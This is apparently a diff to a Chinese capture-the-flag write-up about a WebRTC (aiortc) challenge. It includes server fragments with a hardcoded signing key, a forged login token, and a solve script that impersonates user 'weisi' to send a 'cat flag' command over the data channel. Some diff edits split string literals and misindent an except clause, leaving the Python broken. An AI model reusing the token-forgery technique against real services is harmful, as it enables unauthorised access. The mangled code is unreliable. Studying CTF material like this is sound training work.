@@ -19,7 +19,7 @@
 
 aiortc – app.py中引用的库文件
 
-app<beta版本>.py – 部分源码
+app.py – 部分源码
 
 cmdHostory – 部分部署命令
 
@@ -65,7 +65,8 @@ token字段长度大于50字节 之后按长度进行拆分，其中最后一部
 
 无论登录的身份是什么，实际上都会走webRTC建立后续的信道进行通信。
 
-可以参考aiortc官方提供的example，本题实现没有过多改动。联想到之前流量分析时提示的是无权限读flag，那么我们其实只要以伟思的身份传token再正常建立一个WebRTC Client重发xiaolanlan:cat flag就可以拿到flag了。
+可以参考aiortc官方提供的example，本题实现没有过多改动。联想到之前流量分析时提示的是无权限读flag，那么我们其实只要以伟思的身份传token再正常建立一个WebRTC Client重发xiaolanlan:
+cat flag就可以拿到flag了。
 
 第一点也是最重要的一点，由于webRTC在实现时，会调用内核能力自动选择可用的UDP端口进行信道建立，这使得我们无法使用单一端口映射的方式部署，而端口区间映射也容易导致打不通，所以最优解是使用host模式部署，与宿主机共享端口，独占VPS，这里也再次感谢春秋GAME提供资源，给各位CTFer一个复现的机会。
 
@@ -87,10 +88,12 @@ END
 
 欢迎找到春秋GAME投稿哦～
 
-联系vx:cium0309
+联系vx:
+cium0309
 
 欢迎加入 春秋GAME CTF交流2群
-Q群:703460426
+Q群:
+703460426
 
 
 ```
@@ -103,11 +106,6 @@ Q群:703460426
 
 -key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
 +key = ec.generate_private_key(ec.SECP256R1(), default_backend())
-```
-
-
-
-```
 @@ -46,42 +40,25 @@
 
  logger = logging.getLogger(__name__)
@@ -128,20 +126,15 @@ Q群:703460426
 
 -class DtlsError(Exception):
 -    pass
-```
-
-
-
-```
 async def download(request):
     query = query_parse(request)
     if query == None or 'file' not in query.keys():
         content = "PDC 已经记录了您这次访问行为，普通民众请勿随意访问此系统！"
         return web.Response(status=403, content_type="text/html", text=content)
     filename = query.get('file')
-    file_dir = '<beta版本尚未提供>'
+    file_dir = ''
     file_path = os.path.join(file_dir, filename)
-    if filename != '<beta版本尚未提供>':
+    if filename != '':
         content = "PDC 已经记录了您这次访问行为，普通民众请勿随意访问此系统！"
         return web.Response(status=403, content_type="text/html", text=content)
     if os.path.exists(file_path):
@@ -157,11 +150,6 @@ async def download(request):
             return web.Response(status=404, content_type="text/html", text="文件为空")
     else:
         return web.Response(status=404, content_type="text/html", text="文件未找到")
-```
-
-
-
-```
 try:
     params = await request.json()
 except json.decoder.JSONDecodeError:
@@ -194,43 +182,13 @@ else:
                 return web.Response(status=403, content_type="text/html", text=content)
             elif(timeStamp - int(submitToken[32:45]) < 600000):
                 if submitToken[45:50] == '?????':
-```
-
-
-
-```
-pk2sk = {"?????":"<beta版本尚未提供>","?????":"8d509c28896865f8640f328f30f15721"}
-```
-
-
-
-```
+pk2sk = {"?????":"","?????":"8d509c28896865f8640f328f30f15721"}
 2D041B4B9AA98AFAB545FE0F4651E7951674991453000weisi
-```
-
-
-
-```
-pk2sk = {"luoji":"<beta版本尚未提供>","weisi":"8d509c28896865f8640f328f30f15721"}
-```
-
-
-
-```
+pk2sk = {"luoji":"","weisi":"8d509c28896865f8640f328f30f15721"}
 timeStamp = 1674991453000
 pk = weisi
 signText = 2D041B4B9AA98AFAB545FE0F4651E795
-```
-
-
-
-```
 if submitToken[45:50] == '?????':
-```
-
-
-
-```
 if submitToken[45:50] == '?????':
     if "sdp" not in params.keys() or "type" not in params.keys():
         content = "您好，?????！"
@@ -240,10 +198,10 @@ if submitToken[45:50] == '?????':
         pc = RTCPeerConnection()
         pcs.add(pc)
         @pc.on("datachannel")
-        <beta版本尚未提供>
+        
         @pc.on("connectionstatechange")
-        <beta版本尚未提供>
-        <beta版本尚未提供>
+        
+        
         return web.Response(
             content_type="application/json",
             text=json.dumps(
@@ -261,21 +219,16 @@ elif submitToken[45:50] == '?????':
         pc = RTCPeerConnection()
         pcs.add(pc)
         @pc.on("datachannel")
-        <beta版本尚未提供>
+        
         @pc.on("connectionstatechange")
-        <beta版本尚未提供>
-        <beta版本尚未提供>
+        
+        
         return web.Response(
             content_type="application/json",
             text=json.dumps(
                 {"sdp": pc.localDescription.sdp, "type":pc.localDescription.type}
             ),
         )
-```
-
-
-
-```
 import requests
 import time
 import json
@@ -368,7 +321,8 @@ async def run_offer(pc, signaling):
         await asyncio.sleep(1)
         
     async def send_cat_flag():
-        channel_send(channel, f"xiaolanlan:cat flag")
+        channel_send(channel, f"xiaolanlan:
+cat flag")
         await asyncio.sleep(1)
         
     @channel.on("open")
@@ -410,7 +364,8 @@ if __name__ == "__main__":
     loop = asyncio.get_event_loop()
     try:
         loop.run_until_complete(coro)
-    except KeyboardInterrupt:
+    
+except KeyboardInterrupt:
         pass
     finally:
         loop.run_until_complete(pc.close())
